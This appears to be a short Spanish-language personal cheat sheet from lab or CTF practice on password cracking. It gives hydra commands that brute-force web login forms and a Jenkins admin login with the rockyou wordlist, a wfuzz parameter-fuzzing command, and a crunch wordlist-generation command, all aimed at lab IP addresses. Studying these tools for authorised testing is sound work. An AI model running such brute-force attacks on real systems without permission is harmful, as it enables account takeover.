# Crackeo de contraseñas

## Web

### http - post fuerza bruta con hydra
```
hydra -L users -P passwords 10.10.227.238 http-post-form "/login:username=^USER^&password=^PASS^:F=is incorrect"

hydra -l mike -P /tools/wordlists/rockyou.txt -s 8888 10.10.34.216 http-post-form "/login:user=^USER^&password=^PASS^:Invalid" 
```

- Jenkins admin brute

```bash
hydra -l admin -P /tools/wordlists/rockyou.txt -f 127.0.0.1 -s 9000 http-get /
```

### http - post brute con ffuf

### fuzzing de parametros con wfuzz
```
wfuzz --hh 0 -u http://10.10.39.85/api/site-log.php\?date\=FUZZ  -w wordlist
```
## Generar diccinarios

### Crunch

crunch 15 15 -t v7xUVE2e5bjUc@@ -o gloriapass.txt

ref: 
[Cómo utilizar Crunch: Una Guía Completa](https://blog.ehcgroup.io/2019/01/09/15/29/15/4518/como-utilizar-crunch-una-guia-completa/hacking/ehacking/)





### Referencias
- [Fuzz faster with fuzz](https://medium.com/quiknapp/fuzz-faster-with-ffuf-c18c031fc480)
- https://notes.benheater.com/books/web/page/use-ffuf-to-brute-force-login